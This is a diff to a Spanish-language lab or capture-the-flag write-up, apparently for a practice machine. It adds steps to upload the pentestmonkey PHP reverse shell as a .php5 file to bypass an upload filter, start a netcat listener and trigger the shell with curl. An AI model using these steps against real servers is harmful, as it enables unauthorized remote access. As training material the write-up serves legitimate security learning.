@@ -28,9 +28,21 @@ accedemos a ese path por medio de $IP/panel
 
 
 usar https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php para tener un código de shell de reversa en php
+
 <img width="704" alt="image" src="https://user-images.githubusercontent.com/44788583/202014774-992a3686-6df9-44a8-9033-abc58188e437.png">
 
-crear un archivo para poder utilizarlo (puede ser con nano)
+crear un archivo para poder utilizarlo (puede ser con nano) y se sube a la página como extensión .php5
 
 <img width="519" alt="image" src="https://user-images.githubusercontent.com/44788583/202015553-a623122a-afeb-4c0a-9825-d9ca52d9ece4.png">
  
+para verificar que se subió, ir a: $IP/uploads
+<img width="524" alt="image" src="https://user-images.githubusercontent.com/44788583/202016289-0aeebbf6-f2f4-4e85-937e-d0f609f72a9f.png">
+
+Ahora para comunicarse, debemos poner a la escucha un puerto por medio de netcat y a su vez hacer una llamada al archivo recién subido, cada uno en una terminal diferente: 
+
+terminal 1: 
+nc -nlvp 9999 (puerto especificado en el .php5)
+
+terminal 2: 
+curl http://$IP/uploads_reverse_shell.php5
+
